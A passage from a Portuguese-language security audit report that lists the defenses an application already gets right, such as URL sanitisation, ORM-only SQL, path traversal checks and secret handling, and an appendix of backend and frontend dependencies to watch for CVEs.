13. **M6, M7, B2–B9** — SSL no Postgres puro; owner-scope de jobs; pin de actions; auditoria de submódulos; limpar defaults/exemplos; `debugpy` em loopback.

---

## 7. O que já está correto (não regredir)

O relatório encontrou várias defesas bem-feitas que **devem ser preservadas**:

- **`safeUrl.ts`** — defesa de URL em 4 camadas (prefixo `https?://` obrigatório, `encodeURIComponent` por propriedade, allowlist de protocolo via `new URL()`, `noopener,noreferrer`). Enforce duplo (import + runtime).
- **Zero sinks de HTML** — sem `v-html`/`innerHTML` dinâmico; tudo por `{{ }}` autoescapado.
- **Labels em canvas/GPU** (`FastLabelRenderer`) — não-DOM, imune a XSS.
- **Label formatter parser-based** (sem eval), com registry de modifiers.
- **`?template=` fail-closed** com `SAFE_VALUE_RE`.
- **SQL do Postgres da app 100% ORM** com bound params — sem injeção.
- **Path traversal duplamente barrado** (`named_store.py` + `blob_storage.py` com `is_relative_to`).
- **Sem SSRF** — nenhuma URL vinda do usuário é buscada; specs REST declaradas em código e validadas.
- **Segredos nunca em respostas nem em logs nem no git** — `rest/spec.py:131-150` rebuilda campo-a-campo de propósito para nunca vazar auth no payload de config.
- **PyPI via Trusted Publishing (OIDC)**, sem token de longa vida; gitleaks como gate no CI.

---

## 8. Apêndice — Dependências para acompanhamento de CVE

**Backend** (`api/pyproject.toml`, todos lower-bound sem upper): fastapi `>=0.109`, uvicorn `>=0.27`, pydantic `>=2.5`, sqlalchemy `>=2.0`, httpx `>=0.26`, jinja2 `>=3.1`, **sqlglot `>=26.0`** (é um *controle de segurança* — é o parser read-only; divergência de parsing vs. Spark = bypass do validador, independente de CVE), asyncpg `>=0.31`, orjson `>=3.11.9`. **`gsql2rsql`** é dependência first-party de path local que gera SQL a partir de Cypher — auditar como código in-house.

**Frontend** (`frontend/package.json`): vue `^3.4.15`, primevue `^4.5.4`, **axios `^1.6.5`** (o caret flutua sobre os advisories de SSRF/proto-pollution de 1.7.x/1.8.x — o lockfile é o que embarca; pinar/auditar), three `^0.170.0`, codemirror `^6`. Sem DOMPurify (correto — não há sinks de HTML).
